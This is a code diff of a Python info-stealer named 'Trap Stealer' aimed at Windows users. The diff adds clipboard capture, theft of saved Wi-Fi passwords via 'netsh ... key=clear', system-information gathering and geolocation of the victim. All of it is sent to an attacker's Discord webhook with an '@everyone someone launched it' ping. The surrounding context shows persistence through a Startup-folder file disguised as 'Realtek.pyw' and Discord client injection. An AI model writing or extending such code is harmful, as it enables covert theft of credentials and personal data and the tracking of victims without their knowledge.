@@ -29,8 +29,8 @@ from base64 import b64decode
 from Crypto.Cipher import AES
 from json import loads as json_loads
 import os, os.path, zipfile
-import shutil
-
+import shutil, json
+import win32clipboard
 ### CONFIG ### 
 webhook = '' #Put ur webhook
 
@@ -122,7 +122,15 @@ USER_NAME = getpass.getuser()
 
 path = f"{os.getenv('appdata')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"
 
+def Clipboard():
+  win32clipboard.OpenClipboard()
+  clipboard_data = win32clipboard.GetClipboardData()
+  win32clipboard.CloseClipboard()
 
+  return clipboard_data
+
+
+clipboardtext = Clipboard()
 def startup():
     global StartupMessage
     StartupMessage = 'Sucessfully added to startup'
@@ -190,21 +198,58 @@ def inj_discord():
 
 inj_discord()
 
+def systemInfo():
+    system = platform.system()
+    node_name = platform.node()
+    release = platform.release()
+    version = platform.version()
+    machine = platform.machine()
+    processor = platform.processor()
+    username = os.getlogin() if os.name == "nt" else os.getenv("USER")
+    home_dir = os.path.expanduser("~")
 
+    sys_info = f"System information:\n`{system}`\nNode name: `{node_name}`\nRelease: `{release}`\nVersion: `{version}`\nMachine: `{machine}`\nProcessor: `{processor}`\nHome directory: `{home_dir}`\n"
+
+    return sys_info
+
+def wifi_password_stealer():
+    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="ignore").split('\n')
+    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
+
+    wifi_profiles = []
+
+    for profile in profiles:
+        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8', errors="ignore").split('\n')
+        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
+        try:
+            wifi_profiles.append((f"SSID: {profile}, Password: {results[0]}"))
+        except IndexError:
+            wifi_profiles.append((f"SSID: {profile}, Password: Cannot be read!"))
+
+    return wifi_profiles
+
+
+wifi_password = wifi_password_stealer
 def globalInfo():
-    ip = getip()
-    username = os.getenv("USERNAME")
-    ipdata = loads(urlopen(Request(f"https://ipinfo.io/{ip}/json")).read().decode())
-    country = ipdata["country"]
-    country_code = ipdata["country"].lower()
-    state = ipdata["region"]
-    postal = ipdata["postal"]
+    url = 'https://ipinfo.io/json'
+    response = urllib.request.urlopen(url)
+    data = json.load(response)
+    ip = data['ip']
+    loc = data['loc']
+    location = re.findall(r'\d+.\d+', loc)
+    latitude = location[0]
+    longitude = location[1]
+    username = os.getlogin()
+    country = data['country']
+    country_code = data['country'].lower()
+    region = data['region']
+    city = data['city']
+    postal = data['postal']
     computer_name = socket.gethostname()
-    private_ip = socket.gethostbyname(computer_name)
     cores = os.cpu_count()
     gpu = os.popen("nvidia-smi --query-gpu=gpu_name --format=csv,noheader").read()
-    
-    globalinfo = f":flag_{country_code}:  - `{username.upper()} | {ip} ({country})`\nMore Information 👀 : \n :flag_{country_code}: - `({state}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Core : `{cores}` \nGPU : `{gpu}` "
+
+    globalinfo = f":flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`\nMore Information 👀 : \n :flag_{country_code}: - `({region}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Cores: `{cores}` \nGPU : `{gpu}` \nLatitude + Longitude  : {latitude}, {longitude} "
     return globalinfo
 
 def getip():
@@ -545,6 +590,7 @@ try:
 except:
     pass
 
+sysinfo = systemInfo()
 data = {
     "username": "Trap Stealer",
     "content": "@everyone someone launched it",
@@ -552,7 +598,7 @@ data = {
     "embeds": [
         {
             "title": "🍪 Trap Stealer Information",
-            "description": f"{globalinfo}\nStartup : {StartupMessage}",
+            "description": f"{globalinfo}\n**👀 Even more information** : \n {sysinfo}\n\n**Startup** : {StartupMessage}\nClipboard text : ```{clipboardtext}```",
             "color": 0xffb6c1,
             "thumbnail": {
                 "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
